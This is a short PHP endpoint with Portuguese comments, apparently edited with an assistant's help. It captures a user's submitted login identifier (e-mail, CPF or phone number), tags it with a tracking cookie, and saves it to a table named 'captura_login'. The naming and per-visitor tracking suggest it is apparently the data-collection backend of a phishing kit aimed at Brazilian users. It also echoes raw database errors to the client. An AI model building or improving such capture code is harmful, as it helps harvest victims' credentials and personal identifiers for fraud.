<?php
// ADIÇÃO 1: Iniciar a sessão. Essencial para usar a variável $_SESSION.
session_start();

// Define o cabeçalho de resposta como JSON
header('Content-Type: application/json');

// --- PASSO 1: LER O COOKIE DE SESSÃO ---
if (!isset($_COOKIE['identificador_cliente'])) {
    echo json_encode(['success' => false, 'error' => 'ID de sessão não encontrado. Limpe os cookies e tente novamente.']);
    exit;
}
$session_id = $_COOKIE['identificador_cliente'];

// Inclui o coração do projeto para ter acesso ao banco de dados ($pdo)
require 'db.php';

// Pega os dados enviados via POST (em formato JSON)
$data = json_decode(file_get_contents('php://input'), true);

// Validação simples dos dados recebidos
if (!isset($data['identificador']) || empty(trim($data['identificador']))) {
    echo json_encode(['success' => false, 'error' => 'O campo identificador é obrigatório.']);
    exit;
}

$identificador = trim($data['identificador']);

// ADIÇÃO 2: Lógica para determinar o tipo de identificador
$tipo_identificador = 'Indefinido';
$apenasNumeros = preg_replace('/\D/', '', $identificador);

if (filter_var($identificador, FILTER_VALIDATE_EMAIL)) {
    $tipo_identificador = 'E-mail';
} elseif (strlen($apenasNumeros) == 11) {
    // Para simplificar, consideramos 11 dígitos como CPF para exibição.
    $tipo_identificador = 'CPF';
} elseif (strlen($apenasNumeros) == 10) {
    $tipo_identificador = 'Telefone';
}


try {
    // --- PASSO 2: AJUSTAR A QUERY SQL --- (Seu código aqui já está correto)
    $stmt = $pdo->prepare(
        "INSERT INTO captura_login (session_id, identificador) VALUES (?, ?)"
    );
    
    // --- PASSO 3: EXECUTAR A QUERY --- (Seu código aqui já está correto)
    $stmt->execute([$session_id, $identificador]);
    
    $lastId = $pdo->lastInsertId();
    
    // ADIÇÃO 3: Salvar os dados na sessão antes de enviar a resposta ao frontend
    $_SESSION['identificador_usuario'] = $identificador;
    $_SESSION['tipo_identificador'] = $tipo_identificador;

    // Retorna uma resposta de sucesso com o ID
    echo json_encode(['success' => true, 'id' => $lastId]);

} catch (PDOException $e) {
    // Em caso de erro no banco de dados, retorna uma mensagem de erro
    echo json_encode(['success' => false, 'error' => 'Erro ao salvar no banco de dados: ' . $e->getMessage()]);
}

?>